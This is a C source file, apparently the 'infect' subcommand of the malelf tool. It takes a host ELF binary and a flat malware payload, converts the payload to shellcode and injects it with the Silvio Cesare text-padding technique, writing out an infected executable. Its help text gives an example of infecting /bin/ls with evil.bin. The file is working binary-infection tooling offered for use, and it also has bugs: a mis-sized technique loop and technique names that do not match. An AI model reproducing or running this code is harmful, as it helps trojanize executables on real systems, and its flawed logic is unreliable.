/*
 * The malelf tool was written in pure C and developed using malelf library
 * to analyze (static/dynamic) malwares and infect ELF binaries. Evil using
 * this tool is the responsibility of the programmer.
 *
 * Author: Tiago Natel de Moura <tiago4orion@gmail.com>
 *
 * Contributor: Daniel Ricardo dos Santos <danielricardo.santos@gmail.com>
 *              Paulo Leonardo Benatto <benatto@gmail.com>
 *
 * Copyright 2012, 2013 by Tiago Natel de Moura. All Rights Reserved.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <limits.h>
#include <unistd.h>
#include <getopt.h>
#include <assert.h>
#include <errno.h>

#include "util.h"
#include "infect.h"

#include <malelf/defines.h>
#include <malelf/error.h>
#include <malelf/debug.h>
#include <malelf/binary.h>
#include <malelf/shellcode.h>
#include <malelf/infect.h>

char *malelf_techniques[] = {
        "silvio-cesare",
        "nop"
};

#define N_TECHNIQUES 1

int g_argc;
char **g_argv;

void malelf_infect_help()
{
        HELP("\n");
        HELP("This command is used to assist in the process of binary ");
        HELP("infection.\n");
        HELP("Usage: malelf infect <options>\n");
        HELP("         -h, --help    \tInfect Help\n");
        HELP("         -i, --input   \tInput host file\n");
        HELP("         -o, --output  \tOutput infected file\n");
        HELP("         -m, --malware \tFLAT binary malware.\n");
        HELP("         -t, --technique  \tTechnique to infect.");
        HELP(" Default is 0 or 'silvio-text-padding'.\n");
HELP("                          \tUse %s infect -l to list ", *g_argv);
        HELP("techniques available.\n");
        HELP("Example: %s infect -i /bin/ls -o myls -m evil.bin -t "
        "'silvio-text-padding'\n", *g_argv);
        HELP("\n");
        exit(MALELF_SUCCESS);
}

_u32 _malelf_list_techniques()
{
        int i;

        HELP("List of infect techniques supported:\n\n");
        for (i = 0; i < N_TECHNIQUES; i++) {
                HELP("\t%u - %s\n", i, malelf_techniques[i]);
        }

        return MALELF_SUCCESS;
}


_u32 malelf_infect_verify_technique(MalelfInfect *obj)
{
        char *endptr;
        long val;
        unsigned i;
        assert (NULL != obj->technique);

        errno = 0;    /* To distinguish success/failure after call */
        val = strtol(obj->technique, &endptr, 10);

        /* Check for various possible errors */

        if ((errno == ERANGE && (val == LONG_MAX || val == LONG_MIN))
            || (errno != 0 && val == 0)) {
                MALELF_PERROR(errno);
                return MALELF_ERROR;
        }

        if (endptr == obj->technique) {
                MALELF_DEBUG_INFO("No digits were found in technique\n");
                /* parse string */
                for (i = 0;
                     i < sizeof (malelf_techniques)/sizeof (char);
                     i++) {
                        if (strncmp(malelf_techniques[i],
                                    obj->technique,
                                    strlen(malelf_techniques[i])) == 0) {
                                obj->itech = i;
                                return MALELF_SUCCESS;
                        }
                }

                return MALELF_ERROR;
        }

        /* If we got here, strtol() successfully parsed a number */

        if (*endptr != '\0') {
                fprintf(stderr,
                        "Mixed digits and string in technique. Use"
                        "(malelf infect -l) to show available techniques"
                        "...\n");
                return MALELF_ERROR;
        }

        if (val >= 0 && val < (long) (sizeof (malelf_techniques)/sizeof(_u8))) {
                obj->itech = (_u8) val;
        } else {
                fprintf(stderr,
                        "Technique number out of range... Use "
                        "(malelf infect -l) to list available "
                        "techniques.\n");
                return MALELF_ERROR;
        }

        return MALELF_SUCCESS;
}

_u32 _malelf_infect_cesare(MalelfInfect *obj)
{
        _u32 result = MALELF_SUCCESS;
        MalelfBinary input;
        MalelfBinary output;
        MalelfBinary malware;
        MalelfBinary malware_ready;
        _u32 magic_bytes = 0;

        MALELF_DEBUG_INFO("Infecting by silvio cesare technique.");

        malelf_binary_init_all(4,
                               &input,
                               &output,
                               &malware,
                               &malware_ready);

        result = malelf_binary_open(&input, obj->ifname);
        if (MALELF_SUCCESS != result) {
                goto cesare_error;
        }

/*        result = malelf_binary_open(&output, obj->ofname);
        if (MALELF_SUCCESS != result) {
                goto cesare_cleanup;
                }*/

        if (MALELF_ELF32 == input.class) {
                malware.class = MALELF_FLAT32;
                malware_ready.class = MALELF_FLAT32;
        } else if (MALELF_ELF64 == input.class) {
                malware.class = MALELF_FLAT64;
                malware_ready.class = MALELF_FLAT64;
        } else {
                malware.class = MALELF_FLAT;
                malware_ready.class = MALELF_FLAT;
        }

        result = malelf_binary_open(&malware, obj->mfname);
        if (MALELF_SUCCESS != result) {
                goto cesare_error;
        }

        malware_ready.fname = "/tmp/malelf_ready";
        _u32 magic_offset = 0;
        result = malelf_shellcode_create_flat(&malware_ready,
                                              &malware,
                                              &magic_offset,
                                              0,
                                              0);

        if (MALELF_SUCCESS != result) {
                goto cesare_error;
        }

        result = malelf_infect_silvio_padding32(&input,
                                                &output,
                                                &malware_ready,
                                                0,
                                                magic_bytes);

        if (MALELF_SUCCESS != result) {
                goto cesare_error;
        }

        result = malelf_binary_write(&output, obj->ofname, 1);

        if (MALELF_SUCCESS == result) {
                goto cesare_cleanup;
        }

cesare_error:
        if (MALELF_SUCCESS != result) {
                MALELF_PERROR(result);
        }

cesare_cleanup:
        malelf_binary_close(&input);
        malelf_binary_close(&output);
        malelf_binary_close(&malware);
        malelf_binary_close(&malware_ready);
        return result;
}

_u32 _malelf_infect(MalelfInfect *obj)
{
        _u32 result = MALELF_SUCCESS;

        assert (NULL != obj->ifname &&
                NULL != obj->ofname &&
                NULL != obj->mfname &&
                NULL != obj->technique &&
                -1 == obj->ifd &&
                -1 == obj->ofd &&
                -1 == obj->mfd);

        result = malelf_infect_verify_technique(obj);

        if (MALELF_SUCCESS != result) {
                MALELF_PERROR(result);
                return result;
        }

        assert (obj->itech != -1);

        switch (obj->itech) {
        case INFECT_TECH_CESARE:
                result = _malelf_infect_cesare(obj);
                break;
        case INFECT_TECH_NOP:
//                result = _malelf_infect_nop(obj);
                break;
        default:
                result = MALELF_ERROR;
        }

        return result;
}

static _u32 _malelf_infect_handle_options(MalelfInfect *obj,
                                          int option)
{
        static _u8 error = MALELF_SUCCESS;

        switch (option) {
        case INFECT_HELP:
                malelf_infect_help();
                break;
        case INFECT_INPUT:
                obj->ifname = optarg;
                MALELF_DEBUG_INFO("input filename = '%s'", obj->ifname);
                break;
        case INFECT_OUTPUT:
                obj->ofname = optarg;
                MALELF_DEBUG_INFO("output filename = '%s'", obj->ofname);
                break;
        case INFECT_MALWARE:
                obj->mfname = optarg;
                MALELF_DEBUG_INFO("malware filename = '%s'",
                                  obj->mfname);
                break;
        case INFECT_TECHNIQUE:
                obj->technique = optarg;
                MALELF_DEBUG_INFO("technique = '%s'", obj->technique);
                break;
        case INFECT_LIST:
                _malelf_list_techniques();
                exit(0);
        case ':':
                printf("Unknown option character '%s'.\n", optarg);
                break;
        case INFECT_UNKNOWN:
                malelf_infect_help();
                error = MALELF_ERROR;
                break;
        }

        return error;
}

static _u32 _malelf_infect_options(MalelfInfect *obj)
{
        _i32 option = 0;
        _u32 error = MALELF_ERROR;
        int option_index = 0;
        static struct option long_options[] = {
                {"help", 0, 0, INFECT_HELP},
                {"input", 1, 0, INFECT_INPUT},
                {"output", 1, 0, INFECT_OUTPUT},
                {"malware", 1, 0, INFECT_MALWARE},
                {"technique", 1, 0, INFECT_TECHNIQUE},
                {"list", 0, 0, INFECT_LIST},
                {0, 0, 0, 0}
        };

        if (2 == g_argc) {
                malelf_infect_help();
                return MALELF_ERROR;
        }

        while ((option = getopt_long (g_argc, g_argv, "hi:o:m:t:l",
                                      long_options, &option_index)) != -1) {
                error = _malelf_infect_handle_options(obj, option);
        }

        if (MALELF_SUCCESS == error ) {
                if (obj->ifname != NULL &&
                    obj->ofname != NULL &&
                    obj->technique != NULL &&
                    obj->mfname != NULL) {
                        error = _malelf_infect(obj);
                } else {
                        HELP("-i, -o, -t and -m are required!\n");
                        return MALELF_ERROR;
                }
        }

        return error;
}

_u32 malelf_infect_init(MalelfInfect *obj,
                        int argc,
                        char **argv)
{
        obj->ifname = NULL;
        obj->ofname = NULL;
        obj->mfname = NULL;
        obj->ifd = -1;
        obj->ofd = -1;
        obj->mfd = -1;
        obj->technique = NULL;
        obj->itech = -1;

        g_argc = argc;
        g_argv = argv;

        return _malelf_infect_options(obj);
}

_u32 malelf_infect_finish(MalelfInfect *infect)
{
        UNUSED(infect);
        return MALELF_SUCCESS;
}
